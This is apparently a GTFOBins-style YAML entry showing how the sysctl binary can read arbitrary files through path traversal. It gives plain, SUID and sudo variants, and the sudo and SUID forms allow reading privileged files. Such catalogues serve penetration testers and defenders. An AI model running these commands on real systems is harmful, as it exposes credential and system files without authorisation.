---
functions:
  file-read:
    - description: It reads data from arbitrary files when combined with a path-traversal. The -p argument can also be used in place of -n.
    - code: |
        LFILE=file_to_read
        sysctl -n "/../../../../../$LFILE"
  suid:
    - code: |
        LFILE=file_to_read
        ./sysctl -n "/../../../../../$LFILE"
  sudo:
    - code: |
        LFILE=file_to_read
        sudo sysctl -n "/../../../../../$LFILE"
---
